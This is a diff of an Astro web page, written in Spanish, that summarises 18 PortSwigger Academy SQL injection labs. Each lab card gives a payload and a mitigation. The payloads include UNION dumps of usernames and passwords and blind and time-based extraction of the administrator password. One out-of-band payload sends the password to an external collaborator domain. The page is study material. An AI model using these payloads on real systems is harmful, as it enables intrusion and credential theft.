@@ -2,101 +2,238 @@
 import Navigation from "../components/Navigation.astro";
 import Footer from "../components/Footer.astro";
 
-// Datos de los 18 laboratorios adaptados del documento PDF
+// Información extraída y resumida de los 18 laboratorios de PortSwigger (PDF act08-Equipo1)
 const labs = [
   {
-    id: "Lab01",
+    id: "01",
     title: "Vulnerability in WHERE clause (hidden data)",
     nivel: "Apprentice",
-    tipo: "SQLi clásica (Lógica booleana)",
-    objetivo: "Mostrar productos no lanzados (released=0).",
-    vulnerabilidad: "Concatenación directa de entradas en la cláusula WHERE.",
-    procedimiento: "Interceptar `/filter?category=` y añadir el payload para anular la condición de lanzamiento.",
-    payload: "' OR 1=1--",
-    explicacion: "La comilla cierra el string, `OR 1=1` hace la condición siempre verdadera y `--` comenta el resto de la consulta original.",
-    mitigacion: "Uso de consultas preparadas (Parameterized Queries)."
+    tipo: "In-band (Boolean-based)",
+    objetivo: "Visualizar productos no lanzados.",
+    vulnerabilidad: "Falta de sanitización en parámetros de filtrado URL.",
+    procedimiento: "Modificar el parámetro de categoría para invalidar la condición de filtrado original.",
+    payload: "'+OR+1=1--",
+    explicacion: "La comilla cierra la cadena, 'OR 1=1' crea una condición siempre verdadera y '--' comenta el resto de la consulta.",
+    mitigacion: "Implementar consultas preparadas (PreparedStatement)."
   },
   {
-    id: "Lab02",
+    id: "02",
     title: "Login bypass",
     nivel: "Apprentice",
-    tipo: "SQLi en formulario de autenticación",
-    objetivo: "Acceder como administrator sin contraseña.",
-    vulnerabilidad: "Falta de validación en los campos del formulario de inicio de sesión.",
-    procedimiento: "Ingresar en el campo de usuario el payload y cualquier texto en password.",
+    tipo: "In-band (Auth Bypass)",
+    objetivo: "Acceder como administrador.",
+    vulnerabilidad: "Concatenación directa de credenciales en la consulta de autenticación.",
+    procedimiento: "Inyectar comandos en el campo de usuario para anular la verificación de contraseña.",
     payload: "administrator'--",
-    explicacion: "Cierra el campo de usuario y comenta la validación de la contraseña en la base de datos.",
-    mitigacion: "Consultas preparadas y hashing de contraseñas."
+    explicacion: "Indica a la base de datos que busque al usuario 'administrator' y descarte el resto de la lógica de validación.",
+    mitigacion: "Uso de ORM seguro y hashing de contraseñas."
   },
   {
-    id: "Lab03",
+    id: "03",
+    title: "UNION attack, determining the number of columns",
+    nivel: "Practitioner",
+    tipo: "UNION-based",
+    objetivo: "Identificar cuántas columnas devuelve la consulta original.",
+    vulnerabilidad: "El parámetro de categoría es vulnerable a operadores UNION.",
+    procedimiento: "Incrementar el índice de 'ORDER BY' hasta que el servidor devuelva un error.",
+    payload: "'+ORDER+BY+3--",
+    explicacion: "Determina la estructura de la tabla original para preparar un ataque UNION posterior.",
+    mitigacion: "Validación de tipos de datos en parámetros de entrada."
+  },
+  {
+    id: "04",
+    title: "UNION attack, finding a column containing text",
+    nivel: "Practitioner",
+    tipo: "UNION-based",
+    objetivo: "Hallar una columna que acepte datos de tipo string.",
+    vulnerabilidad: "Filtro vulnerable que permite inyectar nulos y valores de prueba.",
+    procedimiento: "Probar valores de cadena en cada columna identificada mediante UNION SELECT.",
+    payload: "'+UNION+SELECT+NULL,'abc',NULL--",
+    explicacion: "Verifica compatibilidad de tipos de datos para la exfiltración.",
+    mitigacion: "Listas blancas para parámetros de filtrado."
+  },
+  {
+    id: "05",
+    title: "UNION attack, retrieving data from other tables",
+    nivel: "Practitioner",
+    tipo: "UNION-based",
+    objetivo: "Obtener usuarios y contraseñas de la tabla 'users'.",
+    vulnerabilidad: "Exposición de datos de tablas externas mediante UNION.",
+    procedimiento: "Ejecutar una consulta combinada para volcar la tabla de usuarios.",
+    payload: "'+UNION+SELECT+username,+password+FROM+users--",
+    explicacion: "Extrae el contenido completo de las columnas de credenciales.",
+    mitigacion: "Principio de menor privilegio en la cuenta de la DB."
+  },
+  {
+    id: "06",
+    title: "UNION attack, retrieving multiple values in a single column",
+    nivel: "Practitioner",
+    tipo: "UNION-based",
+    objetivo: "Extraer múltiples datos cuando solo hay una columna de texto disponible.",
+    vulnerabilidad: "Limitación de columnas para salida de datos.",
+    procedimiento: "Concatenar campos usando separadores específicos.",
+    payload: "'+UNION+SELECT+username||'~'||password+FROM+users--",
+    explicacion: "Usa el operador de concatenación (|| o CONCAT) para unir datos en un solo resultado.",
+    mitigacion: "Codificación de salida y consultas parametrizadas."
+  },
+  {
+    id: "07",
     title: "DB type and version (Oracle)",
     nivel: "Practitioner",
-    tipo: "UNION-based SQLi",
-    objetivo: "Determinar la versión de la base de datos Oracle.",
-    vulnerabilidad: "El filtro de categorías permite inyección basada en UNION.",
-    procedimiento: "Determinar número de columnas con `ORDER BY` y luego inyectar la consulta de versión.",
+    tipo: "Information Schema",
+    objetivo: "Identificar la versión del motor Oracle.",
+    vulnerabilidad: "Fuga de información a través de tablas del sistema.",
+    procedimiento: "Consultar la tabla global 'v$version'.",
     payload: "'+UNION+SELECT+BANNER,+NULL+FROM+v$version--",
-    explicacion: "Se usa `FROM DUAL` o tablas del sistema como `v$version` específicas de Oracle.",
-    mitigacion: "Validación de entradas y ocultar errores detallados de la base de datos."
+    explicacion: "Oracle requiere la cláusula FROM siempre; se usa v$version para detalles técnicos.",
+    mitigacion: "Deshabilitar acceso a tablas de catálogo para usuarios web."
   },
-  // ... Se continúa la estructura para los 18 laboratorios
   {
-    id: "Lab13",
+    id: "08",
+    title: "DB type and version (MySQL/Microsoft)",
+    nivel: "Practitioner",
+    tipo: "Information Schema",
+    objetivo: "Identificar la versión en MySQL o MSSQL.",
+    vulnerabilidad: "Variables globales expuestas.",
+    procedimiento: "Inyectar la variable de versión del sistema.",
+    payload: "'+UNION+SELECT+@@version,+NULL%23",
+    explicacion: "@@version es la variable estándar en estos motores; '#' comenta en MySQL.",
+    mitigacion: "Configuración de seguridad del motor de DB."
+  },
+  {
+    id: "09",
+    title: "Listing database content (Non-Oracle)",
+    nivel: "Practitioner",
+    tipo: "Information Schema",
+    objetivo: "Mapear tablas y columnas de la base de datos.",
+    vulnerabilidad: "Acceso no restringido a 'information_schema'.",
+    procedimiento: "Consultar la tabla 'columns' filtrando por la tabla de interés.",
+    payload: "'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users'--",
+    explicacion: "Permite conocer la estructura exacta antes de extraer datos.",
+    mitigacion: "Restringir permisos de lectura sobre esquemas de información."
+  },
+  {
+    id: "10",
+    title: "Listing database content (Oracle)",
+    nivel: "Practitioner",
+    tipo: "Information Schema",
+    objetivo: "Mapear tablas en base de datos Oracle.",
+    vulnerabilidad: "Exposición de 'all_tab_columns'.",
+    procedimiento: "Consultar tablas de sistema específicas de Oracle.",
+    payload: "'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABC'--",
+    explicacion: "Utiliza las vistas de catálogo de Oracle para enumerar campos.",
+    mitigacion: "Hardening de la base de datos."
+  },
+  {
+    id: "11",
+    title: "Blind SQLi with conditional responses",
+    nivel: "Practitioner",
+    tipo: "Blind (Boolean-based)",
+    objetivo: "Exfiltrar contraseña mediante respuestas Sí/No.",
+    vulnerabilidad: "La cookie de rastreo se usa en una consulta SQL vulnerable.",
+    procedimiento: "Analizar si el mensaje 'Welcome back' aparece según condiciones inyectadas.",
+    payload: "TrackingId=xyz' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a",
+    explicacion: "Si la primera letra es 'a', la página muestra el saludo; de lo contrario, no.",
+    mitigacion: "Uso de IDs de rastreo no relacionados con la lógica de DB."
+  },
+  {
+    id: "12",
+    title: "Blind SQLi with conditional errors",
+    nivel: "Practitioner",
+    tipo: "Blind (Error-based)",
+    objetivo: "Exfiltrar datos provocando errores controlados.",
+    vulnerabilidad: "El servidor devuelve error 500 ante consultas inválidas pero no mensajes.",
+    procedimiento: "Usar 'CASE' para forzar una división por cero si la condición se cumple.",
+    payload: "TrackingId=xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'",
+    explicacion: "El error 500 confirma que la premisa dentro del CASE es verdadera.",
+    mitigacion: "Manejo genérico de excepciones HTTP."
+  },
+  {
+    id: "13",
     title: "Visible error-based SQL injection",
     nivel: "Practitioner",
-    tipo: "Error-based SQLi",
-    objetivo: "Extraer la contraseña del administrador mediante errores visibles.",
-    vulnerabilidad: "La aplicación muestra errores de base de datos detallados al usuario.",
-    procedimiento: "Forzar un error de conversión de datos usando `CAST` para filtrar información.",
+    tipo: "Error-based (Visible)",
+    objetivo: "Extraer datos directamente de los mensajes de error.",
+    vulnerabilidad: "Errores de base de datos detallados visibles al usuario.",
+    procedimiento: "Provocar un error de conversión de tipos (Cast) que incluya el dato buscado.",
     payload: "TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--",
-    explicacion: "El motor intenta convertir el string de la contraseña a entero, fallando y mostrando el valor en el mensaje de error.",
-    mitigacion: "Manejo genérico de errores y sanitización de cookies."
+    explicacion: "El motor intenta convertir la contraseña a entero y muestra el valor original en el error.",
+    mitigacion: "Desactivar el 'Display Errors' en producción."
   },
   {
-    id: "Lab15",
+    id: "14",
+    title: "Blind SQLi with time delays",
+    nivel: "Practitioner",
+    tipo: "Blind (Time-based)",
+    objetivo: "Confirmar vulnerabilidad mediante pausas.",
+    vulnerabilidad: "La aplicación procesa la consulta pero no muestra cambios visuales ni errores.",
+    procedimiento: "Inyectar funciones de retardo como pg_sleep().",
+    payload: "TrackingId=x'||pg_sleep(10)--",
+    explicacion: "Si el servidor tarda 10 segundos en responder, la inyección es exitosa.",
+    mitigacion: "Sanitización de cabeceras HTTP y cookies."
+  },
+  {
+    id: "15",
     title: "Blind SQLi with time delays and data exfiltration",
     nivel: "Practitioner",
-    tipo: "Time-based Blind SQLi",
-    objetivo: "Recuperar la contraseña carácter por carácter midiendo el tiempo de respuesta.",
-    vulnerabilidad: "La aplicación no responde con cambios de contenido, pero procesa funciones de retardo.",
-    procedimiento: "Utilizar `pg_sleep()` dentro de un `CASE` para confirmar cada carácter mediante pausas.",
-    payload: "' || (SELECT CASE WHEN (username='administrator' AND SUBSTR(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--",
-    explicacion: "Si la letra es correcta, el servidor tarda 5 segundos en responder.",
-    mitigacion: "Consultas parametrizadas y monitorización de tiempos de respuesta anómalos."
+    tipo: "Blind (Time-based)",
+    objetivo: "Recuperar contraseña midiendo tiempos de respuesta.",
+    vulnerabilidad: "Vulnerabilidad ciega en cabeceras de sesión.",
+    procedimiento: "Combinar CASE y pg_sleep para adivinar caracteres.",
+    payload: "TrackingId=x'%3bSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--",
+    explicacion: "La demora de red confirma el carácter correcto de la contraseña.",
+    mitigacion: "WAF con detección de anomalías de tiempo."
   },
   {
-    id: "Lab18",
+    id: "16",
+    title: "Blind SQLi with out-of-band (OAST) techniques",
+    nivel: "Practitioner",
+    tipo: "Out-of-band (OOB)",
+    objetivo: "Forzar una interacción DNS/HTTP externa.",
+    vulnerabilidad: "La DB puede realizar peticiones de red externas.",
+    procedimiento: "Usar funciones como 'extractvalue' para activar una resolución DNS.",
+    payload: "TrackingId=x'||(SELECT+extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://BURP-COLLABORATOR-ID.oastify.com/\"> %remote;]>'),'/l') FROM dual)--",
+    explicacion: "El servidor vulnerable intenta resolver el dominio del atacante.",
+    mitigacion: "Restringir tráfico de salida (egress) del servidor de DB."
+  },
+  {
+    id: "17",
+    title: "Blind SQLi with OAST and data exfiltration",
+    nivel: "Practitioner",
+    tipo: "Out-of-band (OOB)",
+    objetivo: "Extraer la contraseña a través de una consulta DNS.",
+    vulnerabilidad: "Capacidad de concatenar datos exfiltrados en subdominios DNS.",
+    procedimiento: "Inyectar el resultado de la consulta como parte de la URL externa.",
+    payload: "'+UNION+SELECT+extractvalue(xmltype('...http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.oastify.com...'))--",
+    explicacion: "La contraseña llega como un subdominio a los logs del atacante.",
+    mitigacion: "Consultas parametrizadas y bloqueo de funciones XML peligrosas."
+  },
+  {
+    id: "18",
     title: "Filter bypass via XML encoding",
     nivel: "Practitioner",
-    tipo: "In-band SQLi (Bypass via XML)",
-    objetivo: "Evadir un WAF/Filtro que bloquea palabras clave SQL.",
-    vulnerabilidad: "El endpoint procesa XML pero no valida el contenido codificado de las etiquetas.",
-    procedimiento: "Codificar el payload SQL en formato de entidades XML hexadecimales.",
-    payload: "<storeId>1 &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; ...</storeId>",
-    explicacion: "Las entidades XML (como &#x53; para 'S') se decodifican en el servidor después de pasar el filtro de seguridad.",
-    mitigacion: "Validación de esquema XML y filtrado de caracteres después de la decodificación."
+    tipo: "WAF Bypass / XML",
+    objetivo: "Evadir filtros de palabras prohibidas.",
+    vulnerabilidad: "El analizador XML decodifica entidades después de la validación del WAF.",
+    procedimiento: "Codificar palabras como SELECT o UNION en formato hexadecimal XML.",
+    payload: "<storeId>1 &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54; 1,2,3</storeId>",
+    explicacion: "El WAF no detecta la palabra 'SELECT' porque está ofuscada como entidades XML.",
+    mitigacion: "Validar datos después de la decodificación XML."
   }
 ];
 ---
 
 <html lang="es">
-<head>
+  <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>SQL Injection - Road to Hall of Fame</title>
+    <title>SQL Injection Labs - Road to Hall of Fame</title>
+    
     <script is:inline>
       (function () {
         const savedTheme = localStorage.getItem("theme") || "dark";
-        const prefersDark = window.matchMedia(
-          "(prefers-color-scheme: dark)"
-        ).matches;
-        const initialTheme =
-          savedTheme === "system"
-            ? prefersDark
-              ? "dark"
-              : "light"
-            : savedTheme;
+        const prefersDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
+        const initialTheme = savedTheme === "system" ? (prefersDark ? "dark" : "light") : savedTheme;
 
         if (initialTheme === "dark") {
           document.documentElement.classList.add("dark");
@@ -105,127 +242,180 @@ const labs = [
         }
       })();
     </script>
-    <script>
-      document.addEventListener("DOMContentLoaded", function () {
-        window
-          .matchMedia("(prefers-color-scheme: dark)")
-          .addEventListener("change", (e) => {
-            if (localStorage.getItem("theme") === "system") {
-              if (e.matches) {
-                document.documentElement.classList.add("dark");
-              } else {
-                document.documentElement.classList.remove("dark");
-              }
-            }
-          });
-      });
-    </script>
+
     <style>
-      html,
-      body {
+      :root { 
+        --bg: #ffffff; 
+        --text: #171717; 
+        --card: #f9f9f9; 
+        --dot-color: #80808030;
+        --accent: #2563eb;
+      }
+      .dark { 
+        --bg: #0a0a0a; 
+        --text: #ededed; 
+        --card: #151515; 
+        --dot-color: #ffffff20;
+        --accent: #60a5fa;
+      }
+
+      html, body {
         margin: 0;
         padding: 0;
-        height: 100%;
-        overflow-x: hidden;
+        min-height: 100vh;
+        font-family: 'Inter', system-ui, sans-serif;
       }
+
       body {
         display: flex;
         flex-direction: column;
-        min-height: 100vh;
+        background-color: var(--bg);
+        color: var(--text);
+        transition: background-color 0.3s, color 0.3s;
+        /* Fondo hexagonal de road-to-hall-of-fame */
+        background-image: 
+          radial-gradient(circle, var(--dot-color) 1px, transparent 1px),
+          radial-gradient(circle, var(--dot-color) 1px, transparent 1px);
+        background-size: 24px 41.57px;
+        background-position: 0 0, 12px 20.78px;
+        background-attachment: fixed;
       }
+
       main {
         flex: 1;
-      }
-      section[class*="text-gray-700"] {
-        margin: 0;
-        padding: 0;
-        flex-shrink: 0;
+        width: 100%;
       }
 
-      .dot-hexagon-light {
-        background-image: radial-gradient(
-            circle,
-            #80808045 1px,
-            transparent 1px
-          ),
-          radial-gradient(circle, #80808045 1px, transparent 1px);
-        background-size: 24px 41.57px;
-        background-position:
-          0 0,
-          12px 20.78px;
+      .container { 
+        max-width: 1100px; 
+        margin: 0 auto; 
+        padding: 5rem 1.5rem; 
       }
 
-      .dot-hexagon-dark {
-        background-image: radial-gradient(
-            circle,
-            #ffffff35 1px,
-            transparent 1px
-          ),
-          radial-gradient(circle, #ffffff35 1px, transparent 1px);
-        background-size: 24px 41.57px;
-        background-position:
-          0 0,
-          12px 20.78px;
+      header {
+        text-align: center;
+        margin-bottom: 4rem;
       }
+
+      .lab-grid { 
+        display: grid; 
+        grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+        gap: 1.5rem; 
+      }
+
+      .lab-card { 
+        background: var(--card); 
+        border: 1px solid #33333340;
+        padding: 1.8rem; 
+        border-radius: 12px;
+        transition: all 0.3s ease;
+        display: flex;
+        flex-direction: column;
+        position: relative;
+        overflow: hidden;
+      }
+
+      .lab-card:hover { 
+        transform: translateY(-5px); 
+        border-color: var(--accent);
+        box-shadow: 0 10px 30px -15px rgba(0,0,0,0.4);
+      }
+
+      .lab-id {
+        font-family: monospace;
+        color: var(--accent);
+        font-weight: bold;
+        font-size: 1.2rem;
+        margin-bottom: 0.5rem;
+      }
+
+      .badge { 
+        font-size: 0.7rem; 
+        padding: 0.2rem 0.5rem; 
+        border-radius: 99px; 
+        background: #333; 
+        color: #eee;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+      }
+
+      code { 
+        background: #111; 
+        color: #50fa7b; /* Color tipo terminal */
+        padding: 0.6rem; 
+        border-radius: 6px; 
+        font-size: 0.85rem; 
+        font-family: 'JetBrains Mono', monospace;
+        display: block;
+        margin-top: 0.5rem;
+        border: 1px solid #222;
+        word-break: break-all;
+      }
+
+      .section-title { 
+        color: #888; 
+        text-transform: uppercase; 
+        font-size: 0.65rem; 
+        letter-spacing: 1.2px; 
+        margin-top: 1.2rem; 
+        margin-bottom: 0.2rem;
+        font-weight: 700;
+      }
+
+      .content-text {
+        font-size: 0.9rem;
+        line-height: 1.5;
+        color: var(--text);
+        opacity: 0.9;
+      }
+
+      .mitigation {
+        color: #fbbf24;
+        font-weight: 500;
+      }
+
+      h1 { font-size: 2.5rem; letter-spacing: -1px; margin-bottom: 0.5rem; }
+      p.subtitle { color: #666; font-size: 1.1rem; }
     </style>
-    <style>
-        :root { --bg: #ffffff; --text: #171717; --card: #f5f5f5; }
-        .dark { --bg: #0a0a0a; --text: #ededed; --card: #171717; }
-        body { background-color: var(--bg); color: var(--text); font-family: system-ui, sans-serif; transition: 0.3s; }
-        .container { max-width: 1000px; margin: 0 auto; padding: 2rem; }
-        .lab-grid { display: grid; gap: 2rem; margin-top: 3rem; }
-        .lab-card { 
-            background: var(--card); border: 1px solid #333; padding: 1.5rem; border-radius: 8px;
-            transition: transform 0.2s;
-        }
-        .lab-card:hover { transform: translateY(-4px); border-color: #666; }
-        .badge { font-size: 0.75rem; padding: 0.2rem 0.6rem; border-radius: 4px; background: #333; color: #fff; }
-        code { background: #222; color: #ff79c6; padding: 0.2rem 0.4rem; border-radius: 4px; font-size: 0.9rem; }
-        .section-title { color: #888; text-transform: uppercase; font-size: 0.7rem; letter-spacing: 1px; margin-top: 1rem; }
-    </style>
-</head>
-<body>
+  </head>
+  <body>
     <Navigation />
     <main class="container">
-        <header>
-            <h1 class="text-4xl font-bold">Road to Hall of Fame: SQL Injection</h1>
-            <p class="text-neutral-500 mt-2">Documentación técnica de 18 escenarios de vulnerabilidad en Web Security Academy.</p>
-        </header>
+      <header>
+        <h1 class="font-bold">Road to Hall of Fame</h1>
+        <p class="subtitle">Análisis Técnico: 18 Laboratorios de SQL Injection - PortSwigger Academy</p>
+      </header>
 
-        <section class="lab-grid">
-            {labs.map((lab) => (
-                <article class="lab-card">
-                    <div class="flex justify-between items-start">
-                        <h2 class="text-xl font-mono text-neutral-300">{lab.id}: {lab.title}</h2>
-                        <span class="badge">{lab.nivel}</span>
-                    </div>
-                    
-                    <p class="section-title">Tipo de SQLi</p>
-                    <p class="text-sm">{lab.tipo}</p>
+      <div class="lab-grid">
+        {labs.map((lab) => (
+          <article class="lab-card">
+            <div class="flex justify-between items-center mb-2">
+              <span class="lab-id">#{lab.id}</span>
+              <span class="badge">{lab.nivel}</span>
+            </div>
+            <h2 class="text-lg font-bold mb-3">{lab.title}</h2>
+            
+            <p class="section-title">Tipo / Vulnerabilidad</p>
+            <p class="content-text">{lab.tipo} — <span class="italic text-neutral-500">{lab.vulnerabilidad}</span></p>
 
-                    <p class="section-title">Objetivo</p>
-                    <p class="text-sm">{lab.objetivo}</p>
+            <p class="section-title">Objetivo</p>
+            <p class="content-text">{lab.objetivo}</p>
 
-                    <p class="section-title">Vulnerabilidad</p>
-                    <p class="text-sm italic text-neutral-400">{lab.vulnerabilidad}</p>
+            <p class="section-title">Procedimiento</p>
+            <p class="content-text">{lab.procedimiento}</p>
 
-                    <p class="section-title">Procedimiento resumido</p>
-                    <p class="text-sm">{lab.procedimiento}</p>
+            <p class="section-title">Payload Empleado</p>
+            <code>{lab.payload}</code>
 
-                    <div class="mt-4 p-3 bg-black rounded border border-neutral-800">
-                        <p class="section-title !mt-0">Comando / Payload clave</p>
-                        <code class="block mt-1 break-all">{lab.payload}</code>
-                    </div>
+            <p class="section-title">Explicación</p>
+            <p class="content-text">{lab.explicacion}</p>
 
-                    <p class="section-title">Explicación de Payload</p>
-                    <p class="text-sm">{lab.explicacion}</p>
-
-                    <p class="section-title">Mitigación recomendada</p>
-                    <p class="text-sm text-green-500/80">{lab.mitigacion}</p>
-                </article>
-            ))}
-        </section>
+            <p class="section-title">Mitigación</p>
+            <p class="content-text mitigation">{lab.mitigacion}</p>
+          </article>
+        ))}
+      </div>
     </main>
     <Footer />
-</body>
+  </body>
 </html>
